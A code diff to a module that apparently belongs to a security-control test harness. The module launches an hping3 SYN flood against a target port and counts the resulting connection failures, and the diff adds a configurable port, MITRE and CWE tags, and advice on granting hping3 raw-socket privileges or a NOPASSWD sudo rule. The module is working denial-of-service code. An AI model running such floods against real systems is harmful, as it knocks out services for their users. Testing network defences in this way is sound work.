@@ -21,8 +21,12 @@ META = {
     "id": "syn_flood",
     "name": "SYN Flood (DoS)",
     "category": "Network Exploitation",
+    "added": True,   # added after the initial harness set
     "control": "Rate-limit / DoS protection (SYN)",
     "fix": "SD-WAN",
+    "mitre": ['T1498.001'],
+    "cwe": ['CWE-400'],
+    "tactic": 'Impact',
     "requires": ["hping3", "timeout"],
     "needs_root": True,           # hping3 needs a raw socket (root or CAP_NET_RAW)
     "serial": True,               # DoS: must run alone
@@ -46,14 +50,15 @@ def _connect_ok(host, port, timeout=1.5):
 
 
 def run(target, ctx):
-    out = [f"# SYN flood DoS vs {target}:{SYN_PORT}  "
+    port = ctx.get_port("syn", SYN_PORT)   # overridable (HARNESS_PORT_SYN / GUI)
+    out = [f"# SYN flood DoS vs {target}:{port}  "
            f"({FLOOD_SECONDS}s flood, {SAMPLES} connect samples)"]
 
     # elevate hping3 via `sudo -n` (never prompts) when not root, so a per-command
     # NOPASSWD rule for hping3 works without running the whole harness as root.
     import core
     flood_cmd = ["timeout", str(FLOOD_SECONDS)] + core.sudo_prefix() + \
-                ["hping3", "-S", "-p", str(SYN_PORT), "--flood", target]
+                ["hping3", "-S", "-p", str(port), "--flood", target]
     try:
         flood = subprocess.Popen(
             flood_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
@@ -63,7 +68,7 @@ def run(target, ctx):
     time.sleep(1)  # let the flood ramp before sampling
     fails = 0
     for _ in range(SAMPLES):
-        if not _connect_ok(target, SYN_PORT):
+        if not _connect_ok(target, port):
             fails += 1
         time.sleep(0.3)
 
@@ -75,16 +80,16 @@ def run(target, ctx):
 
     if fout and any(m in fout.lower() for m in _PRIV_ERR):
         out.append(f"hping3 output: {fout.strip()[:200]}")
-        out.append("FLOOD-PRIV-ERROR: hping3 could not open a raw socket (needs "
-                   "root or CAP_NET_RAW) — the flood never ran. This is NOT "
-                   "evidence the control works. Fix: sudo setcap "
-                   "cap_net_raw,cap_net_admin+eip $(which hping3)")
+        out.append("FLOOD-PRIV-ERROR: hping3 could not run with the privileges it "
+                   "needs — the flood never ran. NOT evidence the control works. "
+                   "Fix any ONE of: setcap cap_net_raw,cap_net_admin+eip "
+                   "$(which hping3); a NOPASSWD sudoers rule for hping3; or run as root.")
         return "\n".join(out)
 
     loss = 100.0 * fails / SAMPLES
     if loss > FAIL_THRESHOLD:
         out.append(f"PASS: DoS effective — {loss:.0f}% of TCP connects to "
-                   f"{SYN_PORT} failed during the flood")
+                   f"{port} failed during the flood")
     else:
         out.append(f"INFO: {loss:.0f}% connect failure (below {FAIL_THRESHOLD}% "
                    "threshold — control likely held)")
